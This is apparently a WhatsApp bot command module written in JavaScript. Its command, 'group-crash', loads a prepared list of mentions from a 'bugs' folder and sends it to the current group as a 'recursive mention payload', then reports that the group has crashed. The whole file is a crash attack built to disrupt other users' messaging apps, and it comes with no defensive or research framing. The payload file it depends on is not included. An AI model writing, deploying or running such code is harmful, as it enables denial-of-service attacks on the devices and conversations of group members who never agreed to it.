import fs from "fs";
import path from "path";

export default {
  name: "group-crash",
  description: "Sends a recursive mention crash to the current group.",
  async execute(msg, { sock }) {
    const filePath = path.join(process.cwd(), "bugs", "mentions.json");

    if (!fs.existsSync(filePath)) {
      return sock.sendMessage(msg.key.remoteJid, {
        text: "❌ mentions.json not found. Run `node make_mentions.js` first.",
      });
    }

    const mentions = JSON.parse(fs.readFileSync(filePath, "utf8"));

    // Only works in groups
    if (!msg.key.remoteJid.endsWith("@g.us")) {
      return sock.sendMessage(msg.key.remoteJid, {
        text: "⚠️ This command can only be used inside a group.",
      });
    }

    // Send recursive mention payload to the same group
    await sock.sendMessage(msg.key.remoteJid, {
      text: "💥 Recursive Mention Payload Sent 💥",
      mentions,
    });

    await sock.sendMessage(msg.key.remoteJid, {
      text: `✅ Group crashed with ${mentions.length} mentions.`,
    });
  },
};
